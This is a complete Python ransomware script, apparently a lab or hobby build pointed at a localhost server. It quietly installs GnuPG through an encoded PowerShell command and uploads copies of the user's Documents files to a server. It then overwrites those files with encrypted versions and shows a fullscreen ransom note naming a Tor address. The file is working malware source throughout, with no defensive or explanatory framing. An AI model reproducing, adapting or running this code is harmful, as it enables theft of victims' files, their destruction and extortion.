import sys
import gnupg       
import requests
import glob
import time
import os
import threading
import base64
import subprocess
import keyboard

server_full_url = base64.b64decode("aHR0cDovLzEyNy4wLjAuMTo4MDAwLw==").decode("utf-8")
active_user = os.getlogin()

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

if not os.path.exists(base64.b64decode("QzovUHJvZ3JhbSBGaWxlcy9nbnVwZw==").decode("utf-8")):
    

    subprocess.call('powershell.exe Invoke-WebRequest -Uri "https://gnupg.org/ftp/gcrypt/binary/gnupg-w32-2.4.5_20240307.exe" -OutFile "$env:TEMP\\gnupg-w32-setup.exe"', startupinfo=si)

    #https://htmlpreview.github.io/?https://raw.githubusercontent.com/Javelinblog/PowerShell-Encoded-Commands-Tool/main/PowerShell.html

    #Start-Process -FilePath "$env:TEMP\gnupg-w32-setup.exe" -ArgumentList "/S" -Wait
    
    subprocess.call('powershell.exe -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGcAbgB1AHAAZwAtAHcAMwAyAC0AcwBlAHQAdQBwAC4AZQB4AGUAIgAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC8AUwAiACAALQBXAGEAaQB0ACAA', startupinfo=si)
    
    #C:\Program Files\gnupg\bin
    gnupg_path = base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xnbnVwZ1xiaW4=").decode("utf-8")
    if gnupg_path not in os.environ["PATH"]:
        os.environ["PATH"] += ":" + gnupg_path

def send_file_to_server(file_path,server_url):
    with open(file_path, "rb") as file:
        filecontent = base64.b64encode(file.read()).decode('utf-8')

    data = {
        'file_name': str(os.path.basename(file_path)),                                       
        'file_content': filecontent
    }
    response = requests.post(server_url, data=data)

def encrypt_file(gpg, file_path, recipient):
    print("[*] Encrypting {}".format(file_path))
    with open(file_path, 'rb') as f:
        #encrypted_data = gpg.encrypt_file(f, recipient)
        encrypted_data = gpg.encrypt_file(f, recipients=[recipient], always_trust=True)         
    with open(file_path, 'wb') as f:
        f.write(str(encrypted_data).encode())

gpg = gnupg.GPG(gpgbinary=base64.b64decode("QzpcUHJvZ3JhbSBGaWxlc1xnbnVwZ1xiaW5cZ3BnLmV4ZQ==").decode("utf-8"))
internet_connection = True

try:
    response = requests.get(server_full_url + "¥¥¥GETTING_PWNED¥¥¥/").json() 
    public_key_content = str(response['key'])
    print("Encryipting with internet key")
    gpg.import_keys(public_key_content)
    recipient = gpg.list_keys()[0]['uids'][0]

except:
    public_key_content = """
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEZieOVhYJKwYBBAHaRw8BAQdACy9JUMzO7iKJ7V3fgUVwFh8KICI12f2ms4aG
++7FGKi0GnJhbnNvbSA8cmFuc29tQHJhbnNvbS5jb20+iJkEExYKAEEWIQSgDPTS
6xzciu1E+XyRyDDbyHl21AUCZieOVgIbAwUJBaOagAULCQgHAgIiAgYVCgkICwIE
FgIDAQIeBwIXgAAKCRCRyDDbyHl21GGzAQD7CD+gtulOxpaYu+1z68RexnWu6eY6
Ewp58hQ7znResAEAklh1s5gPb7fasb+aA3RlbFawWrUoYO11DS+QE3Lpjga4OARm
J45WEgorBgEEAZdVAQUBAQdAczN3Z36uzh30zZqF7CidhmR1T/bCvU3qCystc4WE
O0IDAQgHiH4EGBYKACYWIQSgDPTS6xzciu1E+XyRyDDbyHl21AUCZieOVgIbDAUJ
BaOagAAKCRCRyDDbyHl21CdfAQCps392LVe0KWbHhoeoECbGReV3FRDgAPxW4+Eg
X4uiDwD/QRRT+PEJgxktF3pfVDMY7Y74pCf37g6BFW/AqM1QQAM=
=cIN9

"""
    print("Encryipting local key") 
    internet_connection = False

    import_result = gpg.import_keys(public_key_content)
    public_key = gpg.list_keys(keys=[import_result.fingerprints[0]])[0]
    recipient = public_key['uids'][0]  # Primer User ID

encrypt_paths = ['./encriptar/','C:/Users/{}/Documents/'.format(active_user)]
encrpyt_extensions = ['.txt','.csv','.jpg','.pdf','.zip','.md','.png','.docx','.rar']
files_to_encrypt = []
for path in encrypt_paths:
    for extension in encrpyt_extensions:
        temp_files_extension = glob.glob("{}/*{}".format(path,extension))
        for file in temp_files_extension:
            files_to_encrypt.append(file)

total_files_encrpted = 0
start = time.time()
url = '{}/¥¥¥HELLO_LOSER¥¥¥/'.format(server_full_url)
threads = []
thread_counter = 0
max_thread_counter = 350
max_thread_web = 500

#Coping the files before encrypting them
if internet_connection == True:
    for file in files_to_encrypt:
        thread_2 = threading.Thread(target=send_file_to_server, args=(file,url,))

        try:
            thread_2.start()
            threads.append(thread_2)
            thread_counter += 1
        except:
            print("Limpiando Threads porque ha crasheado")
            for thread in threads:
              thread.join()
            threads.clear()                                                                                                                                                                 
            thread_counter = 0

        if thread_counter >= max_thread_web:
            for thread in threads:
                thread.join()
            threads.clear()
            thread_counter = 0


    for thread in threads:
        thread.join()

    threads.clear()

#Encryipting the files
for file in files_to_encrypt:
    total_files_encrpted += 1
    thread_1 = threading.Thread(target=encrypt_file, args=(gpg,file,recipient,))
    
    try:
        thread_1.start()
        threads.append(thread_1)
    except:
        for thread in threads:
            thread.join()
        threads.clear()
        thread_1.start()
        threads.append(thread_1)
        thread_counter = 0
    thread_counter += 1

    if thread_counter >= max_thread_counter:
        for thread in threads:
            thread.join()
        threads.clear()
        thread_counter = 0


for thread in threads:
    thread.join()

end = time.time()
counter = end - start

web_path = 'C:/Users/{}/Desktop/readme.html'.format(active_user)
web_content = """
<!DOCTYPE html>
<html lang="es" style="background-color: black;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body style="display: flex; flex-direction: column; align-items: center; text-align: center; background: 0px center; --darkreader-inline-bgcolor: rgba(0, 0, 0, 0); --darkreader-inline-bgimage: none;background-color: black;">
    <pre style="font-size: 0.7em;color:white;">
                                                                                                            
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                        █████████████████████                     ███               
                                    █████████████████████████████              ████████             
                         ██     █████████████████████████████████████    ██    █████████            
                              ██████████████  ███████████████████████        ███ ███████            
                       ███████████████████████████████████                 █████   ████             
                       ███████████████████████████████████████████       █ ██████ ██                
                        █████  ██████████████           ███████████    ███      ██                  
              ██████   █████████████     ███████████████████   ██████ █████   ███                   
              ████████ ███████████ ████████████████████████████████████      ██                     
                ███████████████ ███████████████████████████████████ █████  ██     ███               
                   ████ ████ ███████████████████████████████████  █████████      █████              
                ██████████ █████████████████████████████████████████    █████    ██████             
                         ██████████   █████████████████████████   ███████████ █████████             
              ███ ███  ███████            █████████████████           █████ █ ██████████            
             █████    ██████    ████████    █████████████    ███████    ███████ ████████            
             ██████ ███████    ██████████    ██████████    ███████████    ███████                   
            ██████ ███████    ████████████    █████████    ███████████     ███████ ██████           
            █████████████     ████████████     ███████     ███████████     ████████ █████           
                █████████      ██████████       █████       ██████████      █████████               
           ██  ██████████        ██████    ███████████████    ██████        ██████████ ███          
           ██ █████ ██████              ████████████████████               ██████ █████             
              ████  ██████             ███████ ████    ███████             ██████  ████             
             █████  ███████           ███████           ███████          ████████  █████            
             ████   █████████        █████████         █████████        █████████   ████            
             █████  ████████████    ███████████      ████████████    ████████████  █████            
             ██████ ███████████████ ███████████ █████ ███████████ ███████████████ ██████            
              ███   ███████████████████████████       ███████████ ███████████████   ███             
                     █████████████ ███████████ ███ ██  ████████████████████████                     
                        ██████████ ███████████ ███████ ███████████ ██████████████████               
                          ███████  ██████████  ███████  █████████     ██████████████                
         ██  ███████████████████    █████ ██   ███████   ██ █████                                   
              ███████████████████    █████      █████     ██████      █████████████████             
                       ████████                                       ████████                      
                       ██████                             █████████████████                         
                   ███  ██████████████                                                              
                                ██████                                                              
                                ███                 ██████████████████████   ███                    
                        █████████████████████       ██████████                                      
                                       ██████████████████████          ██                           
                                        ████████████████         ██                                 
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
    </pre>
    <h1 style="font-size: 3em;color: white;">Attention! </h1>
    <p style="font-size: 1.5em;color: white;">All your files, documents, photos, databases and other important files are encrypted
        <br>
        The only method of recovering files is to purchase an unique decryptor. Only we can give you this decryptor and only we can recover your files.
    </p>
    <p style="font-size: 1.5em;color: white;">Please contact us as soon as possible, using Tor-browser:</p>
    <p style="font-size: 1.5em; color: #EF999F;">http://threeam7fj33rv5twe5ll7gcrp3kkyyt6ez5stssixnuwh4v3csxdwqd.onion/recovery</p>
    <p style="font-size: 1.5em;color: white;"><br>Access key: <br>[snip]</p>
</body>
</html>
"""
if False == False:
    with open(web_path, 'w' , encoding='utf-8') as f:
        f.write(str(web_content))

print("Se han encriptado un total de {} archivos en {:.8f} segundos.".format(str(total_files_encrpted),counter))
keyboard.press_and_release('win + m')
os.system("start msedge  --kiosk C:/Users/{}/Desktop/readme.html  --edge-kiosk-type=fullscreen".format(active_user))
